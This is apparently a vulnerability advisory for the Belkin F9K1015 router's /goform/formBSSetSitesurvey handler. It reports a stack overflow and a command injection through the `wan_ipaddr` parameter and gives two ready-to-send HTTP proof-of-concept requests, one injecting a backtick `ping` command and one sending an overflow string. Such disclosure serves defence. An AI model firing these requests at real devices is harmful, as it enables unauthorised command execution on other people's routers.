# Belkin F9K1015 formBSSetSitesurvey
### Overview
vendor: Belkin

product: F9K1015

version: 1.00.10

type: Stack Overflow and Command Injection
### Vulnerability Description
Belkin F9K1015 1.00.10 router has a serious buffer overflow vulnerability and a serious command injection vulnerability. This vulnerability can be triggered through the route /goform/formBSSetSitesurvey.
### Vulnerability Details
In the `formBSSetSitesurvey` function, the value of the `wan_ipaddr` parameter is obtained via a post request, and the variable is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `s_11`. Then, the `s_11` variable is passed to the `system` function, which may cause command injection.

![](images/12.png)

### POC
poc1(command injection)
```
POST /goform/formBSSetSitesurvey HTTP/1.1
Host: 192.168.206.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://192.168.206.1
Connection: keep-alive
Referer: http://192.168.206.1/index2.asp
Upgrade-Insecure-Requests: 1
Priority: u=4

action=SetStaticIP&currentband=5&wan_ipaddr=`ping 192.168.206.2 -c 4`
```
poc2(stack overflow)
```
POST /goform/formBSSetSitesurvey HTTP/1.1
Host: 192.168.206.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 1044
Origin: http://192.168.206.1
Connection: keep-alive
Referer: http://192.168.206.1/index2.asp
Upgrade-Insecure-Requests: 1
Priority: u=4

action=SetStaticIP&currentband=5&wan_ipaddr=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
